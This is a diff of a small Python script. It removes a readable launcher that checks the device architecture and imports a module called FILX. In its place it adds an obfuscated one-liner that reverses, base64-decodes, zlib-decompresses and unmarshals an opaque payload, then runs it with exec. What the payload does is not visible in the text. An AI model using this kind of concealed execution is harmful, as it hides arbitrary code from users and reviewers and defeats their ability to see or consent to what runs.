@@ -1,8 +1,1 @@
-import os,time,platform
-Mahadixx = platform.architecture()[0]
-if Mahadixx=='64bit':
-    import FILX
-else:
-    print('\033[1;31m[×] Sorry your Device 32 bit Not Support')
- 
- 
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==wDNRoSvoP5ScGxmwazP/dgOf9RKvN/vTemF/g66CU1Sr3VzMvXdnyAujx3rRZoTWM9eGC/fjHqhu8aeDVM4BfpCQxpoiCF7iMKf8+3ui0vdM42V++L/e9D6Hv+UGqU9ycP59QqF0ESuQ1w3z+lk25kPk065IEQ+vspO01N9Gmfrt/a7vBeshO38seuOV6eNjpSeLNPGoPYIMnP+d2T+fPV3zXiCf6lKnnAnO53+6+khyzJUCS/g2/p8IFmOprwELRWez6D9b5Xl6v8+zfp3TZgyPp2vWXv1afiSXIzyoAHo4jCAIUgv3JB2Bm+MDQ2BmemfSbvFeLShMy/8D4QIIEK9F334AQWwrHdLL+a6CC38Wa+5lbcL1vviA/V2z/vW/CpMm9o1NlWVy/nUurjwYWrStKKce71UWCKW7QLhVWiWV+EWCCzb3QTBTJW0wNFxHWqwSpdGbCOK1DYOqSrVRwo3OkoMmvheOTFiRkbYI30kK6cOU838NFJGB9ispabye0AGJGScCUkbxd2C1WtTjWYmgeiiLQ80FWo2CflUg7iQZLlkotDobvfczGXfdCEeVA3B7a6khPlWZNyFO7V5pEXS7QGTABjGpx6orxFnmP+927nPb3VHgW0qzOezLs4CXEH2thcYtaDQhNra+cPyOlY4maYptGV0qGdXRRaaMvYYLGxqhpOr3bzYVzXzobqWsiP2x8YUdLdrOBNlwxF4jZqub94ojVjYdLZNVDT5Eml5WhX7nm7mD+4PLr5mBy3MCqbPejDkqcyrifO0sPEeaueTAcmfFZ7gr+ZHvp+EOn8HA2WFTzBpxSB5efjmhDLjzN4QMN0W82QbkONi53TTcTNoelgfefC2jX5ebnj90TFqMW5qw4zYlRzl4084KR0Xn66og+fqjeD1izkSL5rDN51Oz7TISc9IqzYkOzxn6MO8OGBxcoC69aChT3AY1XQAWQEYxKDiEKWcogwIXeQ0ozBAdEgQ8Zx2/t0Y9/AGZ28759+jf/pZCocq11gsSc9iVvIco01p0OW7ZEs/g+E47doq45hDoJkROI5tmIFY07OTc2Zs9eXXH7O7mWFdFEIHSjL1cgGthagQ1IpijAICWnOGIZ3ol0ivu22dltnUU0Gv9cUVyJe'))
